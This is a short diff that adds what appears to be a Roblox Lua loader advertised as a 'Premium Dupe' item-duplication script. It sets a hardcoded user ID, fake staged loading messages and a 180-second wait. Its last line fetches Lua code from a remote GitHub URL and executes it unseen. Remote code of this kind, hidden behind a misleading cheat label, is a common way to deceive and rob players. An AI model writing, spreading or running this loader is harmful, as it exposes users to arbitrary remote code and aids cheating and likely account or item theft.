@@ -1,0 +1,7 @@
+_G.UserID = 1940418740
+_G.ScriptName = "Premium Dupe Key:FlareDupeOp12"
+_G.FirstText = "Script Preparing..."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Script.lua", true))()
